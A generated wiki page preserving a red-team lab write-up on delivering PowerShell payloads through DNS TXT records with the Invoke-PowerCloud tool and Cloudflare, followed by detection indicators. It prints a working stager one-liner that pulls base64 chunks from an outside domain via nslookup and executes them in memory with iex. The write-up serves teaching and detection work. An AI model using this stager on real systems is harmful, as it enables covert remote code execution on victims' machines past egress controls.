---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Powershell Payload Delivery via DNS using Invoke-PowerCloud

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-exfiltration-payload-delivery-via-dns-using-invoke-powercloud` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/exfiltration/payload-delivery-via-dns-using-invoke-powercloud.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Powershell Payload Delivery via DNS using Invoke-PowerCloud](../../topics/offensive-security/powershell-payload-delivery-via-dns-using-invoke-powercloud.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-exfiltration-payload-delivery-via-dns-using-invoke-powercloud |
| name | Powershell Payload Delivery via DNS using Invoke-PowerCloud |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/exfiltration/payload-delivery-via-dns-using-invoke-powercloud.md |

## Preserved Source Material

````yaml
_asset_filenames:
- Screenshot from 2018-10-15 22-11-03.png
- Screenshot from 2018-10-15 22-14-53.png
- Screenshot from 2018-10-15 22-16-20.png
- Screenshot from 2018-10-15 22-47-12.png
- Screenshot from 2018-10-15 22-47-26.png
- Screenshot from 2018-10-16 20-12-57.png
- Screenshot from 2018-10-16 20-17-42.png
- empire-stager-via-dns.gif
- invoke-powercloud-demo.gif
_body: "---\ndescription: >-\n  This lab demos a tool or rather a Powershell script I have written to do what\n  the title\
  \ says.\n---\n\n# Powershell Payload Delivery via DNS using Invoke-PowerCloud\n\n## Credits\n\nRushing to say that the tool\
  \ [Invoke-PowerCloud](https://github.com/mantvydasb/powercloud/blob/master/Invoke-PowerCloud.ps1) was heavily inspired by\
  \ and based on the awesome work that Dominic Chell ([@domchell](https://twitter.com/domchell)) from [MDSec](https://twitter.com/MDSecLabs)\
  \ had done with [PowerDNS](https://github.com/mdsecactivebreach/PowerDNS) - go follow them and try out the [tool](https://www.mdsec.co.uk/2017/07/powershell-dns-delivery-with-powerdns/)\
  \ if you have not done it yet.\n\nNot only that, I want to thank Dominic for taking his time to answer some of my questions\
  \ regarding the PowerDNS, the setup and helping me troubleshoot it as I was having \"some\" issues getting the payload delivered\
  \ to the target from the PowerDNS server.\n\n...which eventually led me to Invoke-PowerCloud, so read on.\n\n## What is\
  \ Invoke-PowerCloud?\n\n[Invoke-PowerCloud](https://github.com/mantvydasb/powercloud/blob/master/Invoke-PowerCloud.ps1)\
  \ is a script that allows you to deliver a powershell payload using DNS TXT records to a target in an environment that is\
  \ egress limited to DNS only.\n\n## How is Invoke-PowerCloud different from PowerDNS?\n\nI assume you have read [PowerShell\
  \ DNS Delivery with PowerDNS](https://www.mdsec.co.uk/2017/07/powershell-dns-delivery-with-powerdns/) which explains how\
  \ PowerDNS works.\n\nInvoke-PowerCloud works in a similar fashion, except for a couple of key differences, which may simplify\
  \ the configuration process of your infrastructure to start delivering paylods via DNS. \\\n\\\n**With PowerDNS you need:**\n\
  \n* a dedicated linux box with a public IP where you can run PowerDNS, so it can act as a DNS server\n* you also need multiple\
  \ domain names to get the nameservers configured properly\n\n**With Invoke-PowerCloud you need:**\n\n* a cloudflare.com\
  \ account\n* a domain name whose DNS management is transferred to cloudflare\n\n## Cloudflare? eh?\n\nThe way the tool works\
  \ is by performing the following high level steps:\n\n* Take the powershell payload file and base64 encode it\n* Divide\
  \ the payload into chunks of 255 bytes\n* Create a DNS zone file with DNS TXT records representing each chunk of the payload\
  \ data retrieved from the previous step\n* Send the generated DNS zone file to cloudflare using their APIs\n* Generate two\
  \ stagers for use with authoritative NS/non-authoritative NS\n* Stager can then be executed on the victim system. The stager\
  \ will recover the base64 chunks from the DNS TXT records and rebuild the original payload\n* Stager executes the payload\
  \ in memory!\n\n{% hint style=\"info\" %}\nIf you run the tool again to deliver another payload, the previous DNS TXT records\
  \ will be deleted\n{% endhint %}\n\n## Demo\n\n### One off Configuration\n\nRemember - you need a cloudflare.com account\
  \ for this to work. Assuming you have that, you need to edit the Invoke-PowerCloud as follows:&#x20;\n\n1. your cloudflare\
  \ API key, defined in the variable `$Global:API_KEY`\n2. your cloudflare email address, defined in the variable `$Global:EMAIL`\n\
  \n![](<../../.gitbook/assets/Screenshot from 2018-10-15 22-11-03.png>)\n\n### DNS Management\n\nSecondly, you need to move\
  \ the domain name which you are going to use for payload delivery to cloudflare. In this demo, I will use a domain I own\
  \ `redteam.me` which is now managed by cloudflare:\n\n![](<../../.gitbook/assets/Screenshot from 2018-10-15 22-14-53.png>)\n\
  \nLet's confirm redteam.me DNS is managed by cloudflare by issuing:\n\n```\nhost -t ns redteam.me\n```\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2018-10-15 22-16-20.png>)\n\n### Payload\n\nLet's create a simple payload file - it will print a red message to the\
  \ screen and open up a calc.exe:\n\n{% code title=\"payload.txt\" %}\n```csharp\nWrite-host -foregroundcolor red \"This\
  \ is our first payload using Invoke-\nPowerCloud. As usual, let's pop the calc.exe\"; Start-process calc.exe\n```\n{% endcode\
  \ %}\n\n### Good to Go\n\nWe are now good to go - issue the below on your attacking system:\n\n```csharp\nPS C:\\tools\\\
  powercloud> . .\\powercloud.ps1; Invoke-PowerCloud -FilePath .\\payload.txt -Domain redteam.me -Verbose\n```\n\nThe script\
  \ will generate two stagers. One of them is shown here:\n\n{% code title=\"attacker@victim\" %}\n```csharp\n$b64=\"\"; (1..1)\
  \ | ForEach-Object { $b64+=(nslookup -q=txt \"$_.redteam.me\")[-1] }; iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(($b64\
  \ -replace('\\t|\"',\"\")))))\n```\n{% endcode %}\n\n![](<../../.gitbook/assets/Screenshot from 2018-10-15 22-47-26.png>)\n\
  \nLet's execute the stager on the victim system to get the payload delivered via DNS:\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2018-10-15 22-47-12.png>)\n\n### Animated Demo\n\nEverything in action can be seen in the below gif:\n\n![](../../.gitbook/assets/invoke-powercloud-demo.gif)\n\
  \n## Is Invoke-PowerCloud better than PowerDNS?\n\nNo. It just works slightly differently, but achieves the same end goal.\
  \ Also note, that Cloudflare API rate limiting applies.\n\n## Detection\n\nLet's deliver a PowerShell empire payload using\
  \ DNS and see how the system reacts to this:\n\n![](../../.gitbook/assets/empire-stager-via-dns.gif)\n\nFor those wondering\
  \ about detection possibilities, the following is a list of signs (mix and match) that may qualify the host behaviour as\
  \ `suspicious` and warrant a further investigation:\n\n* host \"suddenly\" bursted \"many\" `DNS TXT` requests to one domain\n\
  * DNS queries follow the naming convention of 1, 2, 3, ..., N\n* majority of DNS answers contain `TXT Lenght` of `255` (trivial\
  \ to change/randomize)\n* DNS answers are all `TTL = 120` (trivial to change/randomize)\n* TXT data in DNS answer has no\
  \ white spaces (easy to change)\n* host suddenly/in a short span of time spawned \"many\" `nslookup` processes\n* has the\
  \ endpoint changed once the DNS lookups stopped? i.e new processes spawned?\n\nBelow is a snippet of the PCAP showing DNS\
  \ traffic from the above demo - note the TXT Length and the data itself:\n\n![](<../../.gitbook/assets/Screenshot from 2018-10-16\
  \ 20-12-57.png>)\n\nSpike of `nslookup` for a host in a short amount of time:\n\n![](<../../.gitbook/assets/Screenshot from\
  \ 2018-10-16 20-17-42.png>)\n\nBelow is a sample PCAP for your inspection:\n\n{% file src=\"../../.gitbook/assets/dns-packets.pcapng\"\
  \ %}\nDNS Traffic Packet Trace\n{% endfile %}\n\n## Download\n\nYou can download or contribute to Invoke-PowerCloud here:\n\
  \n{% embed url=\"https://github.com/mantvydasb/powercloud\" %}\n\n## References\n\n{% embed url=\"https://github.com/mdsecactivebreach/PowerDNS\"\
  \ %}\n\n{% embed url=\"https://www.mdsec.co.uk/2017/07/powershell-dns-delivery-with-powerdns/\" %}"
_relative_path: offensive-security/exfiltration/payload-delivery-via-dns-using-invoke-powercloud.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/exfiltration/payload-delivery-via-dns-using-invoke-powercloud.md
````
